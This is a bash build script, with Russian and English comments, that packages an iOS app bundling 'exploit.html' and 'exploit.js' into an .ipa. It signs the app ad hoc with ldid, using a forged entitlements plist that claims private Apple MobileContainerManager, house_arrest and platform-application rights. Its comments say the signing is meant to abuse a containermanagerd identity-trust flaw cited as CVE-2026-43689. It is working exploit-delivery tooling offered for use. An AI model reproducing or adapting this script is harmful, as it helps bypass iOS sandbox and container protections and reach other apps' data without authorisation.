#!/usr/bin/env bash
# package_ipa.sh: собирает Mach-O arm64 через Theos, отправляет в Payload/App.app,
# подписывает ldid -S (ad-hoc), zip'ит в .ipa. Использовать из папки проекта:
#   cd ~/ios_projects/Test-main && ./package_ipa.sh
set -euo pipefail
export THEOS="${THEOS:-$HOME/theos}"
export PATH="$THEOS/toolchain/linux/iphone/bin:$THEOS/bin:$HOME/ios-toolchain/bin:$HOME/.local/bin:$PATH"
APP_NAME="srk801"
PROJ="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$PROJ/packages"
mkdir -p "$OUT"
cd "$PROJ"
# IOS_DEPLOY_TARGET (напр. arm64-apple-ios13.0 или 13.0) приходит из Tier-B
# workflow; локально не задан — используется TARGET из Makefile проекта.
MAKE_EXTRA=()
if [[ -n "${IOS_DEPLOY_TARGET:-}" ]]; then
    DEPLOY_VER="${IOS_DEPLOY_TARGET##*[^0-9.]}"
    DEPLOY_VER="${DEPLOY_VER:-13.0}"
    MAKE_EXTRA+=(TARGET="iphone:clang:latest:$DEPLOY_VER")
    echo "[IPA] deploy override: ${MAKE_EXTRA[*]}"
fi
echo "[IPA] make package FINALPACKAGE=1 ..."
# Theos refuses project paths with spaces: ALL make steps run through the
# space-free symlink (same inode, so .theos/ staging lands in $PROJ anyway).
LINK="/tmp/opencode/jb26link"
if [[ ! -e "$LINK" ]]; then
    mkdir -p "$(dirname "$LINK")"          # /tmp can be wiped between runs
    ln -s "$PROJ" "$LINK"
fi
if ! (cd "$LINK" && make package FINALPACKAGE=1 "${MAKE_EXTRA[@]}"); then
    echo "[IPA] WARN: make package упал — пробую голый make (без переупаковку)..."
    (cd "$LINK" && make clean >/dev/null 2>&1) || true
    (cd "$LINK" && make FINALPACKAGE=1 "${MAKE_EXTRA[@]}") || {        echo "[IPA] ERROR: сборка не взлетела. Если в логе 'module compiled with Swift X.Y' —" >&2
        echo "[IPA] ERROR: неверная пара тулчейн/SDK, чинится НЕ фоллбэком: bash mint_ios_setup.sh --doctor" >&2
        exit 1
    }
fi
BUNDLE="$(find .theos _ -type d -name "$APP_NAME.app" 2>/dev/null | head -1 || true)"
if [[ -z "$BUNDLE" ]]; then
    echo "[IPA] ERROR: не найден staged .app в .theos/" >&2
    exit 1
fi
echo "[IPA] staged app: $BUNDLE"
STAMP="$(date +%Y%m%d-%H%M%S)"
PAYLOAD="$PROJ/Payload"
rm -rf "$PAYLOAD" "$OUT/${APP_NAME}_${STAMP}.ipa"
mkdir -p "$PAYLOAD"
[[ -f "$BUNDLE/Info.plist" ]] || cp "$PROJ/Info.plist" "$BUNDLE/Info.plist" || true
cp -r "$BUNDLE" "$PAYLOAD/${APP_NAME}.app"
# Theos stages each resource twice: at the bundle root (basename) AND under
# its relative subdirectory. The stage loads Resources/webkit/* via
# subdirectory:"webkit", so the root copies are removed to keep the bundle
# unambiguous.
rm -f "$PAYLOAD/${APP_NAME}.app/exploit.html" "$PAYLOAD/${APP_NAME}.app/exploit.js"
if command -v ldid >/dev/null 2>&1; then
    # ad-hoc (ldid) signature: we control BOTH the entitlements and the
    # CodeDirectory identifier. That is exactly the condition the
    # containermanagerd / house_arrest "identity trust" flaw needs
    # (CVE-2026-43689, CWE-862): MCM authorises the caller by the
    # identifier, and with a dev/ad-hoc signature the identifier is free.
    ENT_TMP="$(mktemp -d)/ent.plist"
    cat > "$ENT_TMP" <<'ENTPLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.mobile.MobileHouseArrest</key><true/>
    <key>com.apple.private.MobileContainerManager.allowed</key><true/>
    <key>com.apple.private.security.storage.MobileContainerManager</key><true/>
    <key>com.apple.rootless.storage.MobileContainerManager</key><true/>
    <key>com.apple.private.security.container-required</key><false/>
    <key>platform-application</key><true/>
    <key>get-task-allow</key><true/>
</dict>
</plist>
ENTPLIST
    ldid -S"$ENT_TMP" "$PAYLOAD/${APP_NAME}.app/$APP_NAME" || ldid -S "$PAYLOAD/${APP_NAME}.app/$APP_NAME" || true
    echo "[IPA] подписано ldid -S"
else
    echo "[IPA] WARN: ldid отсутствует — подпись пропущена."
fi
(cd "$PROJ" && zip -qry "$OUT/${APP_NAME}_${STAMP}.ipa" Payload)
rm -rf "$PAYLOAD"
echo "[IPA] ГОТОВО: $OUT/${APP_NAME}_${STAMP}.ipa"
ls -la "$OUT/${APP_NAME}_${STAMP}.ipa"
